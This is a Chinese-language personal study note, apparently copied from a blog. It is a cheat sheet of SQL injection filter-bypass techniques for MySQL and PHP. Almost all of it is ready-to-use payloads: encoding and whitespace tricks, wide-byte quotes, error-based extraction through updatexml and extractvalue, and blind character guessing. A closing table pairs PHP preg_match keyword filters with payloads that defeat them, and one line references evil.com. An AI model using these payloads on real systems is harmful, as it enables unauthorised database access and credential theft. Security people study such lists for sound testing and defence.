# 2019.07.15记录

[TOC]

## [sql注入绕过](https://www.cnblogs.com/joy-nick/p/5774462.html?utm_source=tuicool&utm_medium=referral)

### 1.1 注释符绕过：
	常用注释符：
		```
		//, -- , /**/, #, --+, -- -, ;,%00,--a
		UNION /**/ Select /**/user，pwd，from user
		U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user
		```

### 1.2 大小写绕过：
```?id=1+UnIoN/**/SeLeCT```

### 1.3 内联注释绕过：
```
id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
```
### 1.4 双关键字绕过：
```?id=1+UNIunionON+SeLselectECT+1,2,3–```

### 1.5 编码绕过：
```
如URLEncode编码，ASCII,HEX,unicode编码绕过
or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。
十六进制编码
SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))
双重编码绕过
?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
一些unicode编码举例：  
单引号：'
%u0027 %u02b9 %u02bc
%u02c8 %u2032
%uff07 %c0%27
%c0%a7 %e0%80%a7
空白：
%u0020 %uff00
%c0%20 %c0%a0 %e0%80%a0
左括号(:
%u0028 %uff08
%c0%28 %c0%a8
%e0%80%a8
右括号):
%u0029 %uff09
%c0%29 %c0%a9
%e0%80%a9
```

### 1.6 空格绕过：
```
两个空格代替一个空格，用Tab代替空格
%20 %09 %0a %0b %0c %0d %a0 /**/
括号绕过空格
在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来
select(user())from dual where 1=1 and 2=2;
```

### 1.7 万能密钥绕过：
```用经典的or 1=1判断绕过,如or ‘swords’ =’swords```

### 1.8 +,-,.号拆解字符串绕过：
```
?id=1' or '11+11'='11+11'
"-"和"."
```

### 1.9 like绕过：
```
?id=1' or 1 like 1 
绕过对“=”，“>”等的过滤
```

### 2.0 in绕过：
```or '1' IN ('swords')```

### 2.1 >,<绕过：
```
or 'password' > 'pass'
or 1<3
```

### 2.2 等价函数与命令绕过：
1. 函数或变量
```
hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
或者：
substr((select 'password'),1,1) = 0x70
strcmp(left('password',1), 0x69) = 1
strcmp(left('password',1), 0x70) = 0
strcmp(left('password',1), 0x71) = -1
```

2. 符号
and和or有可能不能使用，可以试下&&和||
=不能使用的情况，可以考虑尝试<、>

3. 生僻函数
```
MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//evil.com’);
?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))
SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql
?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1))
and extractvalue(1, concat(0x5c, (select user()),0x5c))
```

### 2.3 反引号\`绕过
```select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用```

### 2.4 换行符绕过
```%0a、%0d```

### 2.5 截断绕过
```
%00,%0A,?,/0,////////////////........////////,%80-%99
目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。
././././././././././././././././abc
////////////////////////abc
..1/abc/../1/abc/../1/abc
```

### 2.6 宽字节绕过
```
过滤单引号时，可以试试宽字节
%bf%27 %df%27 %aa%27
```

### 2.7 \N绕过
```
\N其实相当于NULL字符
select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0
select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
```

### 2.8 特殊的绕过函数
1. 通过greatest函数绕过不能使用大小于符号的情况
````
greatest(a,b)，返回a和b中较大的那个数。
当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：
mysql> select greatest(ascii(mid(user(),1,1)),150)=150;
 +------------------------------------------+
| greatest(ascii(mid(user(),1,1)),150)=150 |
 +------------------------------------------+
|                                        1 |
 +------------------------------------------+
如果小于150，则上述返回值为True。
```
2. 通过substr函数绕过不能使用逗号的情况
```
mid(user() from 1 for 1)
或
substr(user() from 1 for 1)
mysql> select ascii(substr(user() from 1 for 1)) < 150;
 +------------------------------------------+
| ascii(substr(user() from 1 for 1)) < 150 |
 +------------------------------------------+
|                                        1 |
 +------------------------------------------+
```
3.使用数学运算函数在子查询中报错
```
exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。
~x 是一个一元运算符，将x按位取补
select exp(~(select*from(select user())a))
mysql报错：
mysql> select exp(~(select*from(select user())a));
ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’
这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：
(select*from(select user())a) 得到字符串 root@localhost
表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数
```

### 附：PHP中一些常见的过滤方法及绕过方式
```
过滤关键字   and or
php代码   preg_match('/(and|or)/i',$id)
会过滤的攻击代码    1 or 1=1 1 and 1=1
绕过方式    1 || 1=1 1 && 1=1

过滤关键字   and or union
php代码   preg_match('/(and|or|union)/i',$id)
会过滤的攻击代码    union select user,password from users
绕过方式    1 && (select user from users where userid=1)='admin'

过滤关键字   and or union where
php代码   preg_match('/(and|or|union|where)/i',$id)
会过滤的攻击代码    1 && (select user from users where user_id = 1) = 'admin'
绕过方式    1 && (select user from users limit 1) = 'admin'

过滤关键字   and or union where
php代码   preg_match('/(and|or|union|where)/i',$id)
会过滤的攻击代码    1 && (select user from users where user_id = 1) = 'admin'
绕过方式    1 && (select user from users limit 1) = 'admin'

过滤关键字   and, or, union, where, limit
php代码   preg_match('/(and|or|union|where|limit)/i', $id)
会过滤的攻击代码    1 && (select user from users limit 1) = 'admin'
绕过方式    1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin

过滤关键字   and, or, union, where, limit, group by
php代码   preg_match('/(and|or|union|where|limit|group by)/i', $id)
会过滤的攻击代码    1 && (select user from users group by user_id having user_id = 1) = 'admin'
绕过方式    1 && (select substr(group_concat(user_id),1,1) user from users ) = 1

过滤关键字   and, or, union, where, limit, group by, select
php代码   preg_match('/(and|or|union|where|limit|group by|select)/i', $id)
会过滤的攻击代码    1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1
绕过方式    1 && substr(user,1,1) = 'a'

过滤关键字   and, or, union, where, limit, group by, select, '
php代码   preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)
会过滤的攻击代码    1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1
绕过方式    1 && user_id is not null 1 && substr(user,1,1) = 0x61 1 && substr(user,1,1) = unhex(61)

过滤关键字   and, or, union, where, limit, group by, select, ', hex
php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)
会过滤的攻击代码    1 && substr(user,1,1) = unhex(61)
绕过方式    1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。

过滤关键字   and, or, union, where, limit, group by, select, ', hex, substr
php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)
会过滤的攻击代码    1 && substr(user,1,1) = lower(conv(11,10,16))/td>
绕过方式    1 && lpad(user,7,1)

过滤关键字   and, or, union, where, limit, group by, select, ', hex, substr, 空格
php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)
会过滤的攻击代码    1 && lpad(user,7,1)/td>
绕过方式    1%0b||%0blpad(user,7,1)

过滤关键字   and or union where
php代码   preg_match('/(and|or|union|where)/i',$id)
会过滤的攻击代码    1 || (select user from users where user_id = 1) = 'admin'
绕过方式    1 || (select user from users limit 1) = 'admin'
```